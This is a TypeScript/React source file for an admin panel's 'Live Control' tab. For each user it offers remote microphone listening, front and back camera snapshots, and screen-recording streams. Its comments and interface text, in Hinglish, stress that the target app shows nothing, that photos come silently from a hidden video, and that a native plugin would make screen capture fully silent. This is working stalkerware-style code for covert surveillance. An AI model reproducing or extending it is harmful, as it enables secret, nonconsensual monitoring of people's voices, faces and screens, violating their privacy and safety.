/**
 * Admin → Live Control tab: mic + dual photo + screen.
 * Theme: same glass / grad / lucide as rest of Admin.
 */
import { useEffect, useMemo, useRef, useState } from "react";
import clsx from "clsx";
import { Camera, Mic, MicOff, Monitor, MonitorOff, Radio } from "lucide-react";
import { auth } from "../firebase";
import { watchEmergencyUsers } from "../lib/alarm";
import {
  clearDeviceControl,
  playMicStream,
  requestSnap,
  setMicListen,
  setScreenRecord,
  watchCapture,
  watchScreenStream,
  type CaptureResult,
} from "../lib/liveControl";
import type { UserDoc } from "../lib/types";
import { relTime } from "../lib/util";
import { Avatar } from "./ui";

const FRESH_MS = 90_000;

function isOnline(u: UserDoc, now: number) {
  return Boolean(u.lastSeen) && now - u.lastSeen < FRESH_MS && u.appState !== "background";
}

export function LiveControlTab() {
  const [users, setUsers] = useState<UserDoc[]>([]);
  const [now, setNow] = useState(Date.now());
  const [listening, setListening] = useState<Record<string, boolean>>({});
  const [screening, setScreening] = useState<Record<string, boolean>>({});
  const [status, setStatus] = useState<Record<string, string>>({});
  const [busy, setBusy] = useState<Record<string, string>>({});
  const [err, setErr] = useState("");
  const [selected, setSelected] = useState<string | null>(null);
  const [capture, setCapture] = useState<CaptureResult | null>(null);
  const [screenInfo, setScreenInfo] = useState("");
  const [screenUrl, setScreenUrl] = useState<string | null>(null);
  const stops = useRef<Record<string, () => void>>({});
  const screenParts = useRef<BlobPart[]>([]);
  const screenMime = useRef("video/webm");
  const adminUid = auth.currentUser?.uid || "";

  useEffect(() => watchEmergencyUsers(setUsers), []);
  useEffect(() => {
    const t = window.setInterval(() => setNow(Date.now()), 15_000);
    return () => window.clearInterval(t);
  }, []);

  useEffect(() => {
    return () => {
      Object.values(stops.current).forEach((s) => s());
      stops.current = {};
      if (screenUrl) URL.revokeObjectURL(screenUrl);
    };
  }, [screenUrl]);

  useEffect(() => {
    if (!selected) {
      setCapture(null);
      return;
    }
    return watchCapture(selected, setCapture);
  }, [selected]);

  useEffect(() => {
    if (!selected || !screening[selected]) {
      setScreenInfo("");
      return;
    }
    let lastSeq = -1;
    return watchScreenStream(selected, (s) => {
      if (!s) {
        setScreenInfo("—");
        return;
      }
      if (s.error) {
        setScreenInfo(s.error);
        return;
      }
      if (!s.active) {
        setScreenInfo("band");
        return;
      }
      setScreenInfo(`live · #${s.seq}`);
      if (s.chunk && s.seq !== lastSeq) {
        lastSeq = s.seq;
        screenMime.current = s.mime || "video/webm";
        try {
          const bin = atob(s.chunk);
          const bytes = new Uint8Array(bin.length);
          for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
          screenParts.current.push(bytes);
          if (screenParts.current.length % 3 === 0) {
            const blob = new Blob(screenParts.current, { type: screenMime.current });
            const url = URL.createObjectURL(blob);
            setScreenUrl((old) => {
              if (old) URL.revokeObjectURL(old);
              return url;
            });
          }
        } catch {
          /* */
        }
      }
    });
  }, [selected, screening]);

  const rows = useMemo(() => {
    return users
      .filter((u) => (u.approval ?? "approved") === "approved" && !u.banned)
      .map((u) => ({ u, online: isOnline(u, now) }))
      .sort((a, b) => Number(b.online) - Number(a.online) || b.u.lastSeen - a.u.lastSeen);
  }, [users, now]);

  const stopMic = async (uid: string) => {
    stops.current[uid]?.();
    delete stops.current[uid];
    setListening((p) => ({ ...p, [uid]: false }));
    setStatus((p) => ({ ...p, [uid]: "" }));
    try {
      await setMicListen(uid, false, adminUid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "band nahi hua");
    }
  };

  const startMic = async (uid: string) => {
    setErr("");
    for (const id of Object.keys(stops.current)) {
      if (id !== uid) await stopMic(id);
    }
    try {
      await setMicListen(uid, true, adminUid);
      setListening((p) => ({ ...p, [uid]: true }));
      setStatus((p) => ({ ...p, [uid]: "connect…" }));
      stops.current[uid] = playMicStream(uid, (s) => setStatus((p) => ({ ...p, [uid]: s })));
    } catch (e) {
      setErr(e instanceof Error ? e.message : "listen start nahi hua");
      setListening((p) => ({ ...p, [uid]: false }));
    }
  };

  const toggleMic = (uid: string) => {
    if (listening[uid]) void stopMic(uid);
    else void startMic(uid);
  };

  const doSnap = async (uid: string) => {
    setErr("");
    setSelected(uid);
    setBusy((p) => ({ ...p, [uid]: "snap" }));
    try {
      await requestSnap(uid, adminUid);
    } catch (e) {
      setErr(e instanceof Error ? e.message : "snap fail");
    } finally {
      window.setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 800);
    }
  };

  const toggleScreen = async (uid: string) => {
    setErr("");
    setSelected(uid);
    const on = !screening[uid];
    if (on) {
      screenParts.current = [];
      if (screenUrl) {
        URL.revokeObjectURL(screenUrl);
        setScreenUrl(null);
      }
    }
    setBusy((p) => ({ ...p, [uid]: "screen" }));
    try {
      await setScreenRecord(uid, on, adminUid);
      setScreening((p) => ({ ...p, [uid]: on }));
      if (!on) setScreenInfo("band");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "screen fail");
    } finally {
      window.setTimeout(() => setBusy((p) => ({ ...p, [uid]: "" })), 600);
    }
  };

  return (
    <div className="space-y-3">
      <p className="text-sm text-paper/55">
        Mic · Photo (front+back) · Screen. Target app UI silent. OS indicators alag.
      </p>
      {err ? (
        <p className="rounded-xl bg-rose/15 px-3 py-2 text-sm text-rose" onClick={() => setErr("")}>
          {err}
        </p>
      ) : null}

      <ul className="space-y-2">
        {rows.length === 0 ? (
          <p className="pt-6 text-center text-paper/55">Koi approved user nahi / list load ho rahi…</p>
        ) : null}
        {rows.map(({ u, online }) => {
          const on = Boolean(listening[u.uid]);
          const scr = Boolean(screening[u.uid]);
          const b = busy[u.uid] || "";
          return (
            <li
              key={u.uid}
              className={clsx(
                "glass rounded-2xl p-3",
                (on || scr) && "ring-1 ring-emerald-400/40",
                !online && "opacity-60",
              )}
            >
              <div className="flex items-center gap-3">
                <Avatar src={u.avatar} name={u.displayName} size="sm" />
                <button
                  type="button"
                  className="min-w-0 flex-1 text-left"
                  onClick={() => setSelected(u.uid)}
                >
                  <span className="block truncate font-semibold">
                    <span
                      className={clsx(
                        "mr-1.5 inline-block size-2 rounded-full",
                        online ? "bg-emerald-400" : "bg-paper/30",
                      )}
                    />
                    {u.displayName}
                  </span>
                  <span className="block truncate text-xs text-paper/50">
                    @{u.username} · {online ? "online" : relTime(u.lastSeen) || "offline"}
                    {on || status[u.uid] ? ` · mic ${status[u.uid] || "on"}` : ""}
                    {scr ? " · screen" : ""}
                  </span>
                </button>
                <div className="flex shrink-0 gap-1.5">
                  <button
                    type="button"
                    className={clsx(
                      "tap grid size-10 place-items-center rounded-xl",
                      on ? "bg-rose/20 text-rose" : "bg-paper/10 text-paper/80",
                    )}
                    disabled={!online && !on}
                    title={on ? "Mic band" : "Mic suno"}
                    onClick={() => toggleMic(u.uid)}
                  >
                    {on ? <MicOff className="size-5" /> : <Mic className="size-5" />}
                  </button>
                  <button
                    type="button"
                    className="tap grid size-10 place-items-center rounded-xl bg-paper/10 text-paper/80"
                    disabled={!online || b === "snap"}
                    title="Front + Back photo"
                    onClick={() => void doSnap(u.uid)}
                  >
                    {b === "snap" ? (
                      <Radio className="size-5 animate-pulse" />
                    ) : (
                      <Camera className="size-5" />
                    )}
                  </button>
                  <button
                    type="button"
                    className={clsx(
                      "tap grid size-10 place-items-center rounded-xl",
                      scr ? "bg-rose/20 text-rose" : "bg-paper/10 text-paper/80",
                    )}
                    disabled={!online && !scr}
                    title={scr ? "Screen band" : "Screen record"}
                    onClick={() => void toggleScreen(u.uid)}
                  >
                    {scr ? <MonitorOff className="size-5" /> : <Monitor className="size-5" />}
                  </button>
                </div>
              </div>
            </li>
          );
        })}
      </ul>

      {selected && capture && (capture.front || capture.back || capture.status) ? (
        <div className="glass space-y-2 rounded-2xl p-3">
          <p className="text-xs font-semibold tracking-wider text-paper/55">
            PHOTOS · {capture.status}
            {capture.error ? ` · ${capture.error}` : ""}
          </p>
          <div className="grid grid-cols-2 gap-2">
            {capture.front ? (
              <figure className="m-0">
                <img
                  src={`data:image/jpeg;base64,${capture.front}`}
                  alt="front"
                  className="w-full rounded-xl bg-black"
                />
                <figcaption className="mt-1 text-center text-xs text-paper/50">Front</figcaption>
              </figure>
            ) : (
              <p className="text-xs text-paper/45">Front nahi mili</p>
            )}
            {capture.back ? (
              <figure className="m-0">
                <img
                  src={`data:image/jpeg;base64,${capture.back}`}
                  alt="back"
                  className="w-full rounded-xl bg-black"
                />
                <figcaption className="mt-1 text-center text-xs text-paper/50">Back</figcaption>
              </figure>
            ) : (
              <p className="text-xs text-paper/45">Back nahi mili</p>
            )}
          </div>
        </div>
      ) : null}

      {selected && (screening[selected] || screenUrl) ? (
        <div className="glass space-y-2 rounded-2xl p-3">
          <p className="text-xs font-semibold tracking-wider text-paper/55">
            SCREEN · {screenInfo || "…"}
          </p>
          {screenUrl ? (
            <video src={screenUrl} controls playsInline muted className="max-h-60 w-full rounded-xl bg-black" />
          ) : (
            <p className="text-xs text-paper/45">
              Chunks aa rahe… (target pe system share-sheet dikh sakta hai)
            </p>
          )}
        </div>
      ) : null}

      <p className="text-xs leading-relaxed text-paper/45">
        Photo app me silent (hidden video). Pehli baar camera permission OS dikhata hai. Screen:
        WebView me system picker aata hai — fully silent ke liye native plugin chahiye. Mic/snap/screen
        app UI pe kuch nahi dikhate.
      </p>
    </div>
  );
}

/** Optional: cleanup controls when admin leaves (not required). */
export async function stopAllFor(uid: string) {
  await clearDeviceControl(uid);
}
